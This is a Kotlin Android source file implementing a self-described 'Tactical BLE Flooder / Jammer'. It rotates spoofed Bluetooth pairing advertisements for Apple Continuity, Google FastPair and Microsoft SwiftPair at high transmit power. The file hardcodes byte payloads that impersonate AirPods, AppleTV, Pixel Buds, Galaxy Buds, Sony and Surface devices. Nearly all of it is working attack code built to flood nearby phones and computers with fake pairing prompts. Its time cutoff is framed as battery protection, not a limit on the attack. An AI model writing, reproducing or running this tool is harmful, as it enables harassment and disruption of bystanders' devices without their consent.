package com.sentinel.host.data.bluetooth

import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothManager
import android.bluetooth.le.AdvertiseCallback
import android.bluetooth.le.AdvertiseData
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.BluetoothLeAdvertiser
import android.content.Context
import android.os.ParcelUuid
import android.util.Log
import com.sentinel.host.data.device.SentinelLogBuffer
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import java.util.UUID
import javax.inject.Inject
import javax.inject.Singleton

/**
 * Representation of a tactical BLE advertising payload.
 */
data class BleSpamPayload(
    val label: String,
    val manufacturerCompanyId: Int? = null,
    val manufacturerData: ByteArray? = null,
    val serviceUuidString: String? = null,
    val serviceData: ByteArray? = null
) {
    override fun equals(other: Any?): Boolean {
        if (this === other) return true
        if (javaClass != other?.javaClass) return false
        other as BleSpamPayload
        if (label != other.label) return false
        if (manufacturerCompanyId != other.manufacturerCompanyId) return false
        if (manufacturerData != null) {
            if (other.manufacturerData == null || !manufacturerData.contentEquals(other.manufacturerData)) return false
        } else if (other.manufacturerData != null) return false
        if (serviceUuidString != other.serviceUuidString) return false
        if (serviceData != null) {
            if (other.serviceData == null || !serviceData.contentEquals(other.serviceData)) return false
        } else if (other.serviceData != null) return false
        return true
    }

    override fun hashCode(): Int {
        var result = label.hashCode()
        result = 31 * result + (manufacturerCompanyId ?: 0)
        result = 31 * result + (manufacturerData?.contentHashCode() ?: 0)
        result = 31 * result + (serviceUuidString?.hashCode() ?: 0)
        result = 31 * result + (serviceData?.contentHashCode() ?: 0)
        return result
    }
}

/**
 * Mobile-Native Tactical BLE Flooder / Jammer.
 *
 * Broadcasts rotating pairing request advertisements across Apple Continuity (0x004C),
 * Google FastPair (0xFE2C), and Microsoft SwiftPair (0x0006) using standard Android BLE
 * userspace APIs with strict duty-cycle auto-cutoff (default 30 seconds) to protect
 * battery endurance and prevent device thermal throttling.
 */
@Singleton
class BleSpamTransmitter @Inject constructor(
    @ApplicationContext private val context: Context
) {
    // Secondary constructor for unit testing with mocked or custom BluetoothAdapter
    constructor(context: Context, customAdapter: BluetoothAdapter?) : this(context) {
        this.injectedAdapter = customAdapter
    }

    private var injectedAdapter: BluetoothAdapter? = null

    companion object {
        private const val TAG = "BleSpamTransmitter"
        const val DEFAULT_DUTY_CYCLE_SEC = 30
        const val MAX_DUTY_CYCLE_SEC = 60
        private const val ROTATION_INTERVAL_MS = 1500L

        // Google FastPair 16-bit Service UUID: 0xFE2C
        const val FASTPAIR_SERVICE_UUID_STRING = "0000fe2c-0000-1000-8000-00805f9b34fb"

        // 1. Apple Continuity (Company ID: 0x004C)
        // 1A. AirPods Pro Setup Prompt (0x07 sub-type, 21-byte compact legacy PDU)
        val PAYLOAD_APPLE_AIRPODS_PRO = byteArrayOf(
            0x07.toByte(), 0x13.toByte(), 0x01.toByte(), 0x0e.toByte(),
            0x20.toByte(), 0x55.toByte(), 0x45.toByte(), 0x01.toByte(),
            0x00.toByte(), 0x00.toByte(), 0x00.toByte(), 0x00.toByte(),
            0x00.toByte(), 0x00.toByte(), 0x00.toByte(), 0x00.toByte(),
            0x00.toByte(), 0x00.toByte(), 0x00.toByte(), 0x00.toByte(),
            0x00.toByte()
        )

        // 1B. AirPods Max Setup Prompt (0x07 sub-type, model 0x0A, 21-byte compact legacy PDU)
        val PAYLOAD_APPLE_AIRPODS_MAX = byteArrayOf(
            0x07.toByte(), 0x13.toByte(), 0x01.toByte(), 0x0a.toByte(),
            0x20.toByte(), 0x55.toByte(), 0x45.toByte(), 0x01.toByte(),
            0x00.toByte(), 0x00.toByte(), 0x00.toByte(), 0x00.toByte(),
            0x00.toByte(), 0x00.toByte(), 0x00.toByte(), 0x00.toByte(),
            0x00.toByte(), 0x00.toByte(), 0x00.toByte(), 0x00.toByte(),
            0x00.toByte()
        )

        // 1C. AppleTV Setup Prompt (0x0D sub-type)
        val PAYLOAD_APPLE_TV_SETUP = byteArrayOf(
            0x0d.toByte(), 0x07.toByte(), 0x01.toByte(), 0x00.toByte(),
            0x00.toByte(), 0x10.toByte(), 0x00.toByte(), 0x00.toByte(),
            0x00.toByte()
        )

        // 2. Google FastPair Models (3-Byte Model ID)
        val FASTPAIR_MODELS = listOf(
            byteArrayOf(0x00.toByte(), 0x00.toByte(), 0x01.toByte()), // Pixel Buds
            byteArrayOf(0x00.toByte(), 0xF5.toByte(), 0x24.toByte()), // Galaxy Buds Pro
            byteArrayOf(0x00.toByte(), 0xCD.toByte(), 0x82.toByte()), // Sony WH-1000XM4
            byteArrayOf(0x00.toByte(), 0x00.toByte(), 0x2C.toByte())  // JBL Flip 6
        )

        // 3. Microsoft SwiftPair (Company ID: 0x0006)
        val PAYLOAD_MICROSOFT_SWIFTPAIR = byteArrayOf(
            0x03.toByte(), 0x00.toByte(), 0x80.toByte(),
            'S'.code.toByte(), 'u'.code.toByte(), 'r'.code.toByte(), 'f'.code.toByte(),
            'a'.code.toByte(), 'c'.code.toByte(), 'e'.code.toByte()
        )
    }

    private val bluetoothAdapter: BluetoothAdapter?
        get() {
            if (injectedAdapter != null) return injectedAdapter
            val bm = context.getSystemService(Context.BLUETOOTH_SERVICE) as? BluetoothManager
            return bm?.adapter
        }

    val advertiser: BluetoothLeAdvertiser?
        get() = bluetoothAdapter?.bluetoothLeAdvertiser

    @Volatile
    var isSpamming: Boolean = false
        private set

    @Volatile
    var currentPayloadLabel: String = "IDLE"
        private set

    @Volatile
    var remainingSeconds: Int = 0
        private set

    private var spamJob: Job? = null
    private val scope = CoroutineScope(Dispatchers.Default)

    private var activeCallback: AdvertiseCallback? = null

    /**
     * Starts rotating BLE pairing spam advertisements across Apple Continuity, Google FastPair,
     * and Microsoft SwiftPair with a hard duty-cycle auto-cutoff (default 30 seconds).
     *
     * @param durationSec Duration in seconds before automatic cutoff to protect thermal/battery states.
     * @param mode Filter for specific payload family ("ALL", "APPLE", "FASTPAIR", "SWIFTPAIR").
     * @return true if advertising was initiated, false if Bluetooth is disabled or unavailable.
     */
    @Synchronized
    fun startSpamSequence(
        durationSec: Int = DEFAULT_DUTY_CYCLE_SEC,
        mode: String = "ALL"
    ): Boolean {
        val adv = advertiser
        if (adv == null || bluetoothAdapter?.isEnabled != true) {
            Log.w(TAG, "Cannot start BLE spam: Bluetooth adapter is disabled or BLE advertising unsupported")
            return false
        }

        stopSpam()

        val boundedDuration = durationSec.coerceIn(5, MAX_DUTY_CYCLE_SEC)
        isSpamming = true
        remainingSeconds = boundedDuration

        SentinelLogBuffer.instance.addAppLog(
            "BleSpam",
            "🚨 ENGAGING BLE JAMMER / FLOODER (Duration: ${boundedDuration}s, Mode: $mode)"
        )

        val payloadQueue = buildPayloadQueue(mode)
        if (payloadQueue.isEmpty()) {
            isSpamming = false
            return false
        }

        spamJob = scope.launch {
            try {
                var queueIndex = 0
                val endTimeMs = System.currentTimeMillis() + (boundedDuration * 1000L)

                while (isActive && System.currentTimeMillis() < endTimeMs) {
                    remainingSeconds = ((endTimeMs - System.currentTimeMillis()) / 1000L).coerceAtLeast(0).toInt()
                    val (label, advertiseData) = payloadQueue[queueIndex % payloadQueue.size]
                    currentPayloadLabel = label

                    cycleAdvertisement(adv, advertiseData)

                    queueIndex++
                    delay(ROTATION_INTERVAL_MS)
                }
            } finally {
                stopSpam()
            }
        }

        return true
    }

    @Synchronized
    fun stopSpam() {
        spamJob?.cancel()
        spamJob = null

        val cb = activeCallback
        if (cb != null) {
            try {
                advertiser?.stopAdvertising(cb)
            } catch (e: Exception) {
                Log.w(TAG, "Error stopping advertising: ${e.message}")
            }
            activeCallback = null
        }

        if (isSpamming) {
            isSpamming = false
            currentPayloadLabel = "IDLE"
            remainingSeconds = 0
            SentinelLogBuffer.instance.addAppLog("BleSpam", "BLE Jammer / Flooder disengaged (Duty-cycle cutoff reached)")
        }
    }

    private fun cycleAdvertisement(adv: BluetoothLeAdvertiser, data: AdvertiseData) {
        val oldCallback = activeCallback
        if (oldCallback != null) {
            try {
                adv.stopAdvertising(oldCallback)
            } catch (_: Exception) {}
        }

        val settings = AdvertiseSettings.Builder()
            .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
            .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
            .setConnectable(true)
            .setTimeout(0)
            .build()

        val newCallback = object : AdvertiseCallback() {
            override fun onStartSuccess(settingsInEffect: AdvertiseSettings?) {
                Log.d(TAG, "Broadcasting $currentPayloadLabel")
            }

            override fun onStartFailure(errorCode: Int) {
                Log.w(TAG, "Advertising failed for $currentPayloadLabel: errorCode=$errorCode")
            }
        }
        activeCallback = newCallback

        try {
            adv.startAdvertising(settings, data, newCallback)
        } catch (e: SecurityException) {
            Log.e(TAG, "BLUETOOTH_ADVERTISE permission denied: ${e.message}")
            stopSpam()
        } catch (e: Exception) {
            Log.e(TAG, "Exception during startAdvertising: ${e.message}")
        }
    }

    fun getRawPayloads(mode: String): List<BleSpamPayload> {
        val list = mutableListOf<BleSpamPayload>()

        // 1. Apple Continuity Payloads
        if (mode.equals("ALL", ignoreCase = true) || mode.equals("APPLE", ignoreCase = true)) {
            list.add(
                BleSpamPayload(
                    label = "Apple AirPods Pro (0x004C)",
                    manufacturerCompanyId = 0x004C,
                    manufacturerData = PAYLOAD_APPLE_AIRPODS_PRO
                )
            )
            list.add(
                BleSpamPayload(
                    label = "Apple AirPods Max (0x004C)",
                    manufacturerCompanyId = 0x004C,
                    manufacturerData = PAYLOAD_APPLE_AIRPODS_MAX
                )
            )
            list.add(
                BleSpamPayload(
                    label = "AppleTV Setup (0x004C)",
                    manufacturerCompanyId = 0x004C,
                    manufacturerData = PAYLOAD_APPLE_TV_SETUP
                )
            )
        }

        // 2. Google FastPair Payloads
        if (mode.equals("ALL", ignoreCase = true) || mode.equals("FASTPAIR", ignoreCase = true)) {
            FASTPAIR_MODELS.forEachIndexed { idx, modelId ->
                val name = when (idx) {
                    0 -> "Google FastPair: Pixel Buds"
                    1 -> "Google FastPair: Galaxy Buds"
                    2 -> "Google FastPair: Sony XM4"
                    else -> "Google FastPair: JBL Flip"
                }
                list.add(
                    BleSpamPayload(
                        label = name,
                        serviceUuidString = FASTPAIR_SERVICE_UUID_STRING,
                        serviceData = modelId
                    )
                )
            }
        }

        // 3. Microsoft SwiftPair Payload
        if (mode.equals("ALL", ignoreCase = true) || mode.equals("SWIFTPAIR", ignoreCase = true)) {
            list.add(
                BleSpamPayload(
                    label = "Microsoft SwiftPair: Surface",
                    manufacturerCompanyId = 0x0006,
                    manufacturerData = PAYLOAD_MICROSOFT_SWIFTPAIR
                )
            )
        }

        return list
    }

    fun buildPayloadQueue(mode: String): List<Pair<String, AdvertiseData>> {
        val raw = getRawPayloads(mode)
        val fastPairUuid = try {
            ParcelUuid.fromString(FASTPAIR_SERVICE_UUID_STRING)
        } catch (_: Throwable) {
            ParcelUuid(UUID.fromString(FASTPAIR_SERVICE_UUID_STRING))
        }

        return raw.mapNotNull { p ->
            val builder = AdvertiseData.Builder()
                .setIncludeDeviceName(false)
                .setIncludeTxPowerLevel(false)

            if (p.manufacturerCompanyId != null && p.manufacturerData != null) {
                builder.addManufacturerData(p.manufacturerCompanyId, p.manufacturerData)
            } else if (p.serviceData != null && fastPairUuid != null) {
                builder.addServiceData(fastPairUuid, p.serviceData)
            }

            try {
                p.label to builder.build()
            } catch (_: Throwable) {
                null
            }
        }
    }
}
